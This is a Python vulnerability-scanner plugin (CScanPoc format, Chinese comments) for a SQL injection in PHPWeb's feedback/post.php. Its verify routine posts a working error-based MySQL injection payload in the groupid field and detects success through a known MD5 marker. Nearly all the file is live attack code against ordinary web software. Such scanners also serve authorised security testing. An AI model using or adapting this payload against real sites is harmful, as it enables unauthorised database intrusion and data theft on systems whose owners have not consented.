# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PHPWeb_0000'  # 平台漏洞编号，留空
    name = 'PHPWeb SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-08'  # 漏洞公布时间
    desc = '''
        PHPWeb具有各种插件、模板和边框可以自由安装卸载、任意组合排版的特点，可以让网站制作者方便地制作网站。
        PHPWeb SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121935'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWeb'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '09893c84-833a-4150-a13a-9637220520dd'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            url = url + '/feedback/post.php'
            post_data = "act=formsend&company=e&content=&groupid=11' AND (SELECT 3264 FROM(SELECT COUNT(*),CONCAT(0x7164647a71,(MID((IFNULL(CAST(md5(3.14) AS CHAR),0x20)),1,50)),0x7177767771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'cmij'='cmij&ImgCode=e&name=e&qq=e&tel=e&title=e"
            req = requests.post(url, data=post_data)
            if req.status_code == 200:
                if '4beed3b9c4a886067de0e3a094246f78' in req.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
